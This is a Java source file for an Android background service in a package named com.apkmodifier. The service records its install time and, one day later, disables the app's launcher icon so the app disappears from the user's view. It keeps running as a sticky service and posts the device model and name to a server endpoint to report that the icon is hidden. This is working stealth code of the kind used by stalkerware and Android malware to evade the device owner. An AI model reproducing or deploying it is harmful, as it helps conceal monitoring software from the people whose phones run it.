package com.apkmodifier;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.ComponentName;
import android.os.IBinder;
import android.os.Handler;
import android.util.Log;

/**
 * Service to automatically hide app icon after 1 day
 * Runs in background and checks installation time
 */
public class AutoHideService extends Service {
    private static final String TAG = "AutoHide";
    private static final String PREFS_NAME = "AppPrefs";
    private static final String KEY_INSTALL_TIME = "install_time";
    private static final String KEY_HIDDEN = "app_hidden";
    private static final long ONE_DAY_MILLIS = 24 * 60 * 60 * 1000; // 1 day in milliseconds
    
    private Handler handler;
    private SharedPreferences prefs;
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler();
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        
        // Record install time if first run
        if (!prefs.contains(KEY_INSTALL_TIME)) {
            prefs.edit().putLong(KEY_INSTALL_TIME, System.currentTimeMillis()).apply();
            Log.d(TAG, "Install time recorded");
        }
        
        startHideCheck();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    private void startHideCheck() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkAndHideIcon();
                // Check every hour
                handler.postDelayed(this, 60 * 60 * 1000);
            }
        }, 0);
    }
    
    private void checkAndHideIcon() {
        try {
            // Check if already hidden
            if (prefs.getBoolean(KEY_HIDDEN, false)) {
                Log.d(TAG, "App already hidden");
                return;
            }
            
            long installTime = prefs.getLong(KEY_INSTALL_TIME, System.currentTimeMillis());
            long currentTime = System.currentTimeMillis();
            long elapsedTime = currentTime - installTime;
            
            Log.d(TAG, "Elapsed time: " + elapsedTime + "ms, Target: " + ONE_DAY_MILLIS + "ms");
            
            // If more than 1 day has passed, hide the icon
            if (elapsedTime >= ONE_DAY_MILLIS) {
                hideAppIcon();
                prefs.edit().putBoolean(KEY_HIDDEN, true).apply();
                Log.d(TAG, "App icon hidden after 1 day");
                
                // Notify via server
                notifyIconHidden();
            } else {
                long remainingTime = ONE_DAY_MILLIS - elapsedTime;
                Log.d(TAG, "Icon will be hidden in: " + (remainingTime / 1000 / 60 / 60) + " hours");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking hide status", e);
        }
    }
    
    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            
            Log.d(TAG, "App icon disabled successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding app icon", e);
        }
    }
    
    private void notifyIconHidden() {
        new Thread(() -> {
            try {
                String deviceId = android.os.Build.MODEL + "_" + android.os.Build.DEVICE;
                java.net.URL url = new java.net.URL("http://127.0.0.1:5000/api/icon_hidden");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                org.json.JSONObject data = new org.json.JSONObject();
                data.put("device_id", deviceId);
                data.put("timestamp", System.currentTimeMillis());
                data.put("message", "App icon hidden after 1 day");
                
                java.io.OutputStreamWriter writer = new java.io.OutputStreamWriter(conn.getOutputStream());
                writer.write(data.toString());
                writer.flush();
                writer.close();
                
                conn.getResponseCode();
                conn.disconnect();
                
                Log.d(TAG, "Icon hidden notification sent");
            } catch (Exception e) {
                Log.e(TAG, "Error sending notification", e);
            }
        }).start();
    }
    
    /**
     * Manually trigger icon hide (for testing or immediate hide)
     */
    public static void forceHideNow(Service service) {
        try {
            PackageManager pm = service.getPackageManager();
            ComponentName componentName = new ComponentName(service, MainActivity.class);
            
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            
            // Mark as hidden
            SharedPreferences prefs = service.getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            prefs.edit().putBoolean(KEY_HIDDEN, true).apply();
            
            Log.d(TAG, "App icon force hidden");
        } catch (Exception e) {
            Log.e(TAG, "Error force hiding", e);
        }
    }
    
    /**
     * Show icon again (for maintenance)
     */
    public static void showIcon(Service service) {
        try {
            PackageManager pm = service.getPackageManager();
            ComponentName componentName = new ComponentName(service, MainActivity.class);
            
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
            
            // Mark as not hidden
            SharedPreferences prefs = service.getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            prefs.edit().putBoolean(KEY_HIDDEN, false).apply();
            
            Log.d(TAG, "App icon shown");
        } catch (Exception e) {
            Log.e(TAG, "Error showing icon", e);
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }
}
